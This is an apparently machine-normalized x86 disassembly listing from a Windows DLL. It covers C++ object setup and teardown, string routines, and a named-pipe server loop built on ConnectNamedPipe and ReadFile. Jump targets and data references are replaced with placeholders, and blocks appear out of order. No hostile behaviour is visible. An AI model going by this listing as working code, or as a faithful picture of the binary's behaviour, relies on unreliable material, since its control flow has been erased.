lea esi [ edi + 0x44 ]
push eax
mov ecx esi
call sub_10005470
cmp [ edi + 0x54 ] 0x4
jne r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0xe8
sete cl
mov eax ecx
jmp r-xdata
push 0x0
lea eax [ ebp - 0x4014 ]
push eax
push esi
lea eax [ ebp - 0x4010 ]
push eax
push [ edi + 0x28 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ edi + 0x5c ]
mov esi [ ecx ]
sub esi eax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x5c ]
push [ ebp - 0x4014 ]
mov ecx [ eax + 0x8 ]
lea eax [ ebp - 0x4010 ]
push eax
mov esi [ ecx ]
call [ esi + 0xc ]
mov ecx [ edi + 0x5c ]
push eax
mov ecx [ ecx + 0x8 ]
call [ esi + 0x10 ]
cmp [ ebp - 0x4014 ] eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x5c ]
mov ebx eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
cmp eax [ ebx ]
jne r-xdata
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x4024 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push 0x2c
call sub_1003cdeb
mov ecx eax
add esp 0x4
mov [ ebp - 0x4028 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push [ eax ]
call [ ntohl@IAT ]
mov ebx eax
shr eax 0x1c
and ebx 0xfffffff
mov [ ebp - 0x4020 ] eax
mov [ ebp - 0x4018 ] ebx
cmp ebx 0x20000
jbe r-xdata
mov ecx [ ebx + 0x8 ]
mov esi 0x4000
mov ebx [ edi + 0x5c ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov ecx [ ebx ]
sub ecx eax
cmp ecx esi
jae r-xdata
mov eax [ edi + 0x5c ]
push [ edi + 0x4 ]
mov ecx [ edi + 0x2c ]
push [ eax + 0x4 ]
push [ eax + 0x8 ]
call sub_10029b70
push [ edi + 0x5c ]
call j_sub_1003f3e3#2
mov [ edi + 0x5c ] 0x0
add esp 0x4
add edi 0x44
mov [ edi + 0x10 ] 0x0
cmp [ edi + 0x14 ] 0x10
jb r-xdata
xor ebx ebx
push ebx
mov ecx eax
call sub_10037bc0
mov ebx eax
jmp r-xdata
push 0x0
sub esp 0x18
xor edx edx
mov eax esp
mov [ ebp - 0x4024 ] esp
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] 0x0
mov [ eax ] dx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] dl
call sub_1002b560
mov ebx eax
jmp r-xdata
mov [ edi ] 0x0
mov edi [ edi ]
push 0xc
call sub_1003cdeb
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
xorps xmm0 xmm0
movq [ eax ] xmm0
mov [ eax + 0x8 ] 0x0
jmp r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
mov ecx [ ebp - 0x4020 ]
mov [ edi + 0x5c ] eax
mov [ eax + 0x8 ] ebx
mov eax [ edi + 0x5c ]
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x5c ]
mov ecx [ ebp - 0x4018 ]
mov [ eax ] ecx
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] 0x0
jb r-xdata
sub_10028680
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10027e50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100286b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050a60
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_1002a060
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10028720
push ebp
mov ebp esp
push 0xffffffff
push sub_10050a88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10028790
push ebp
mov ebp esp
push 0xffffffff
push sub_10050afe
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x18 ]
mov [ edi ] r--data
mov [ ebp - 0x14 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_1002a920
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ edi + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
xorps xmm0 xmm0
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
movdqu [ eax + 0x8 ] xmm0
movq [ eax + 0x18 ] xmm0
mov [ ebp - 0x4 ] 0x8
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x40 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10028870
push ebp
mov ebp esp
push 0xffffffff
push sub_10050b6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x20 ]
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x18 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x5
mov ecx esi
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1002a140
mov [ ebp - 0x4 ] 0x0
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x8
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ CloseHandle@IAT ]
mov [ edi + 0x10 ] 0x0
sub_10028950
push ebp
mov ebp esp
push 0xffffffff
push sub_10050b98
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea esi [ ebx + 0x20 ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x18 ]
mov edx eax
mov edi [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
cmp edx eax
je r-xdata
lea ecx [ ecx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x8 ] edx
cmp edi [ edx + 0x10 ]
jae r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ecx + 0x14 ]
push [ ebp + 0xc ]
call sub_10028080
mov edi 0x1
xor edi edi
jmp r-xdata
lea ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
cmp ecx eax
jne r-xdata
cmp [ ecx + 0x10 ] edi
jae r-xdata
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov edx [ esi ]
call [ edx + 0xc ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_10028a20
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10050bf4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x14 ] esi
mov eax [ esi ]
call [ eax + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ esi + 0x20 ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0x70 ] 0xffffffff
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0xc ]
mov [ esp + 0x38 ] ebx
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x8 ]
mov [ esp + 0x70 ] 0x2
xor edx edx
mov [ esp + 0x58 ] edx
xor ecx ecx
xor eax eax
mov [ esp + 0x5c ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x70 ] 0x3
mov esi [ esp + 0x14 ]
mov edi [ esi + 0x18 ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov eax [ edi ]
push 0x0
push eax
mov [ esp + 0x38 ] eax
call [ ConnectNamedPipe@IAT ]
test eax eax
jne r-xdata
mov edi ecx
sub edi edx
mov eax edi
sar eax 0x2
test eax eax
je r-xdata
jmp r-xdata
mov esi [ esp + 0x14 ]
lea eax [ esi + 0x40 ]
push eax
mov [ esp + 0x1c ] eax
call [ InterlockedIncrement@IAT ]
mov edi [ esp + 0x18 ]
mov ebx eax
mov [ esp + 0x20 ] ebx
lea esp [ esp ]
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x217
sete cl
test ecx ecx
jne r-xdata
mov [ esp + 0x70 ] 0x2
test edx edx
je r-xdata
add edi 0x3
xor eax eax
shr edi 0x2
mov esi edx
cmp edx ecx
cmova edi eax
test edi edi
je r-xdata
lea ecx [ esi + 0x10 ]
mov [ esp + 0x18 ] ecx
mov ecx [ ecx + 0x4 ]
call sub_100281b0
mov ecx [ esp + 0x1c ]
test eax eax
jne r-xdata
cmp eax ecx
je r-xdata
cmp [ esi + 0x10 ] ebx
jae r-xdata
add edi 0x4
mov [ esp + 0x1c ] edi
cmp edi esi
jne r-xdata
mov [ esp + 0x70 ] 0xffffffff
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0xc ]
push 0x1
call [ Sleep@IAT ]
mov esi [ esp + 0x14 ]
mov ecx esi
mov eax [ esi ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push edx
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x60 ] 0x0
mov ebx eax
cmp [ esi + 0xd ] 0x0
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax ecx
jae r-xdata
mov [ esp + 0x2c ] ecx
lea eax [ esp + 0x2c ]
cmp ebx [ eax + 0x10 ]
jb r-xdata
mov eax esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
jmp r-xdata
mov ecx [ esi + 0x14 ]
call sub_10029950
mov [ esp + 0x34 ] ebx
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x8 ]
mov [ esp + 0x70 ] 0x0
mov esi [ esi + 0x14 ]
mov edi [ esi + 0x38 ]
mov esi [ esi + 0x3c ]
mov [ esp + 0x1c ] edi
cmp edi esi
je r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x4c ]
push eax
lea ecx [ ecx + 0x18 ]
call sub_1002a790
push [ esp + 0x4c ]
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x40 ]
push [ esp + 0x4c ]
push eax
lea ecx [ ecx + 0x18 ]
call sub_1002a140
inc ebx
lea esi [ esi + 0x4 ]
cmp ebx edi
jne r-xdata
mov ebx [ esp + 0x24 ]
mov edx [ esp + 0x58 ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx [ esp + 0x20 ]
cmp ecx edx
jne r-xdata
mov edx [ esp + 0x58 ]
cmp edx eax
ja r-xdata
push 0x60
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x18 ] eax
mov [ esp + 0x70 ] 0x1
mov edi [ esp + 0x1c ]
mov ebx [ esp + 0x24 ]
test eax eax
je r-xdata
push edi
call [ InterlockedIncrement@IAT ]
mov esi [ esp + 0x14 ]
mov ebx eax
mov [ esp + 0x20 ] eax
jmp r-xdata
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x28 ]
jmp r-xdata
cmp [ esi + 0xd ] 0x0
je r-xdata
mov edx [ esp + 0x58 ]
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
cmp eax 0x1
jae r-xdata
sub eax edx
mov edx [ esp + 0x20 ]
sar eax 0x2
mov [ esp + 0x18 ] eax
cmp ecx edx
jne r-xdata
xor esi esi
mov esi [ esp + 0x14 ]
mov ecx eax
push [ esi + 0x14 ]
push [ esp + 0x24 ]
push [ esp + 0x38 ]
call sub_10027d80
mov esi eax
jmp r-xdata
mov edx [ esi + 0x18 ]
mov ecx edx
mov eax ecx
mov esi [ ecx + 0x4 ]
cmp [ esi + 0xd ] 0x0
jne r-xdata
cmp [ eax ] edx
je r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea ebx [ ebx ]
add ecx 0x4
mov [ esp + 0x5c ] ecx
mov edx [ esi + 0x14 ]
mov [ esp + 0x1c ] ecx
test edx edx
je r-xdata
mov eax [ eax ]
mov [ ecx ] eax
mov eax [ esp + 0x18 ]
sub ecx [ esp + 0x58 ]
mov eax 0x3fffffff
sar ecx 0x2
sub eax ecx
cmp eax 0x1
jb r-xdata
mov [ esp + 0x30 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x70 ] 0x4
test ecx ecx
je r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
cmp eax 0x1
jae r-xdata
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x44 ] esi
mov esi [ esp + 0x14 ]
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_1002aa30
push eax
add eax 0x10
push eax
push ecx
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esi + 0x18 ]
call sub_1002aad0
jmp r-xdata
mov [ esp + 0x70 ] 0x0
lea ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
mov eax [ edx ]
mov ecx edx
push 0x1
call [ eax ]
mov ecx [ esp + 0x1c ]
push r--data
call sub_1003c5be
sub edx [ esp + 0x58 ]
inc ecx
sar edx 0x2
mov eax 0x3fffffff
mov [ esp + 0x30 ] ecx
mov ecx edx
shr ecx 0x1
sub eax ecx
cmp eax edx
jae r-xdata
mov [ esp + 0x70 ] 0x3
jmp r-xdata
mov edx [ esp + 0x58 ]
mov eax [ edx + eax * 4 ]
mov [ ecx ] eax
mov eax [ esp + 0x18 ]
sub ecx [ esp + 0x58 ]
mov eax 0x3fffffff
sar ecx 0x2
sub eax ecx
cmp eax 0x1
jb r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ edi + 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ esi + 0x3c ]
sub eax ecx
and eax 0xfffffffc
push eax
push ecx
push edi
call sub_1003c640
mov eax [ esp + 0x20 ]
add esp 0xc
add [ esi + 0x3c ] 0xfffffffc
mov ecx [ eax + 0x14 ]
call sub_10029950
add edx ecx
xor edx edx
jmp r-xdata
sub edx [ esp + 0x58 ]
inc ecx
sar edx 0x2
mov eax 0x3fffffff
mov [ esp + 0x30 ] ecx
mov ecx edx
shr ecx 0x1
sub eax ecx
cmp eax edx
jae r-xdata
cmp edx [ esp + 0x30 ]
lea ecx [ esp + 0x58 ]
cmovb edx [ esp + 0x30 ]
push edx
call sub_10003e80
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x5c ]
mov [ esp + 0x20 ] eax
add edx ecx
xor edx edx
jmp r-xdata
cmp edx [ esp + 0x30 ]
lea ecx [ esp + 0x58 ]
cmovb edx [ esp + 0x30 ]
push edx
call sub_10003e80
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x5c ]
mov [ esp + 0x20 ] eax
sub_10028ee0
push ebp
mov ebp esp
push ecx
mov eax ecx
push ebx
push esi
lea ebx [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebx ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov eax [ ebx ]
mov edi [ eax + 0x4 ]
mov esi edi
cmp [ edi + 0xd ] 0x0
jne r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0x4 ] eax
mov eax [ ebx ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x8 ] eax
mov [ ebx + 0x4 ] 0x0
mov ecx [ ecx + 0x14 ]
pop ebx
test ecx ecx
je r-xdata
jmp r-xdata
cmp [ esi + 0xd ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x24 ]
push [ esi + 0x8 ]
mov ecx ebx
call sub_1002a1e0
mov esi [ esi ]
push edi
call j_sub_1003f3e3#2
add esp 0x4
mov edi esi
cmp [ esi + 0xd ] 0x0
je r-xdata
cmp esi edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea ecx [ ecx ]
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub_10028fb0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10028870
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10028fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050c30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_1002a140
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10029050
push ebp
mov ebp esp
push 0xffffffff
push sub_10050cbf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x4 ] 0x0
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x4 ]
mov [ edi ] r--data
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
mov [ edi + 0x30 ] 0x7
mov [ edi + 0x2c ] eax
mov [ edi + 0x1c ] cx
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] ecx
mov [ edi + 0x40 ] ecx
mov [ ebp - 0x4 ] 0x4
lea ecx [ edi + 0x48 ]
push ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
call sub_1001c850
mov [ ebp - 0x4 ] 0x7
lea eax [ edi + 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x8
xorps xmm0 xmm0
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
movdqu [ eax + 0x8 ] xmm0
movq [ eax + 0x18 ] xmm0
mov [ ebp - 0x4 ] 0x9
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x30 ] esp
mov [ ebp - 0x2c ] eax
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0x4 ] 0x9
lea ecx [ ebp - 0x28 ]
call sub_100292a0
add esp 0x18
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0xb
cmp esi eax
je r-xdata
mov ecx 0x19
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
cmp [ edx ] ax
jne r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx esi
push eax
call sub_10003980
push [ esi ]
call j_sub_1003f3e3#2
mov eax [ ebp - 0x30 ]
add esp 0x4
mov ecx edx
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
push edx
lea ecx [ edi + 0x1c ]
call sub_10009730
push 0xffffffff
push 0x0
push esi
lea ecx [ edi + 0x1c ]
call sub_10005cf0
mov [ edi + 0x34 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub ecx [ ebp - 0x2c ]
sar ecx 0x1
mov [ ebp + 0x1c ] 0xf
mov eax edi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10029270
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10029480
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100292a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050d19
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
sub esp 0x18
mov ecx esp
mov [ ebp - 0x18 ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
push 0x0
mov ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_10009420
cmp [ eax ] 0x20
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jbe r-xdata
mov edi [ esi + 0x10 ]
cmp edi 0x1
ja r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov edi [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
cmp edi 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] 0x0
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
lea ecx [ edx - 0x1 ]
cmp edx ecx
jb r-xdata
cmp [ eax + edx * 2 - 0x2 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
lea eax [ edi + edi ]
push eax
lea eax [ ecx + 0x2 ]
push eax
push ecx
call sub_1003c640
add esp 0xc
dec edi
je r-xdata
push 0x0
mov ecx esi
call sub_10009420
cmp [ eax ] 0x20
je r-xdata
push r--data
call sub_1003c5ec
mov eax edx
sub eax ecx
cmp eax 0x1
ja r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0x8
jb r-xdata
mov [ esi + 0x10 ] ecx
cmp edi 0x8
jb r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + ecx * 2 ] dx
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
add eax eax
push eax
lea eax [ ebx + 0x2 ]
push eax
push ebx
call sub_1003c640
add esp 0xc
lea ebx [ eax + ecx * 2 ]
lea edi [ edx - 0x1 ]
mov eax edi
sub eax ecx
je r-xdata
cmp [ esi + 0x10 ] 0x0
ja r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10029480
push ebp
mov ebp esp
push 0xffffffff
push sub_10050d97
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
